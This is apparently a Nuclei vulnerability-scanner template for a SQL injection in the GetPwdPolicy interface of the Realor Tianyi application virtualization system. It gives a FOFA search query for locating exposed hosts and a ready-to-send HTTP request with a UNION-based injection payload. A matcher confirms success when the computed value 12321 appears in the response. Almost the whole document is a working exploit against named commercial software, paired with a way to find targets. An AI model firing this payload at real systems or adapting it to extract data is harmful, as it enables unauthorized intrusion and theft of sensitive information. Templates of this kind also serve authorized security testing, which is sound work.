id: RYTY-GetPwdPolicy-sqli

info:
  name: 瑞友天翼应用虚拟化系统 GetPwdPolicy SQL注入
  author: HuanXiong
  severity: high
  description: |
    fofa: app="REALOR-天翼应用虚拟化系统"
    瑞友天翼应用虚拟化系统 GetPwdPolicy 接口存在SQL注入漏洞,攻击者可以通过发送特制的SQL查询获取敏感信息或执行未授权操作。
  reference:
    - 
  tags: SQL Injection

http:
  - raw:
    - |
      GET /RAPAgent.XGI?CMD=GetPwdPolicy&User=1%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7e%2C%28SELECT+111*111%29%2C0x7e%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+- HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
      Accept: */*
      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
      Accept-Encoding: gzip, deflate, br
      Connection: keep-alive

    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - "status_code == 200 && contains(body, '12321')"
